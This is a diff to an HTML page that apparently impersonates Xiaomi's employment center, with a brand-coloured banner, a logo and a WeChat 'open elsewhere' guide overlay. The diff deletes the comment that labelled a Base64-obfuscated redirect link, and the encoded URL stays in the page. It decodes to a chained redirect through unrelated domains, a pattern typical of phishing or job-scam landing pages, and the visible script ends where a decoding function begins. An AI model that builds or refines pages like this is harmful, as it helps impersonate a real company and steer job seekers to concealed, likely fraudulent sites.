@@ -21,9 +21,24 @@
       display: none;
     }
 
+    /* ✅ 顶部横幅栏 */
+    .top-banner {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: #ff6900; /* 小米橙 */
+      color: white;
+      text-align: center;
+      font-size: 16px;
+      font-weight: bold;
+      padding: 10px 0;
+      z-index: 10000;
+    }
+
     .guide-box {
       position: absolute;
-      top: 10px;
+      top: 60px; /* 向下留出横幅高度 */
       right: 10px;
       text-align: right;
     }
@@ -78,6 +93,9 @@
 
 <!-- 引导层 -->
 <div class="guide-overlay" id="wechatGuide">
+  <!-- ✅ 顶部横幅栏 -->
+  <div class="top-banner">XIaomi就业中心</div>
+
   <div class="center-logo">
     <img src="xiaomi-logo.png" alt="小米 Logo">
   </div>
@@ -90,7 +108,6 @@
 </div>
 
 <script>
-  // Base64 加密后的跳转链接
   const encodedUrl = "aHR0cDovL2Vhc3RsaW9uYWQuY24vSW5kdGx6eC5odG1sP2h0dHBzOi8vZ2dlcnNjLnNob3AvaUhkZ25YL3dpeXJ1aXdycHUvcnlldQ==";
 
   function decodeBase64(str) {
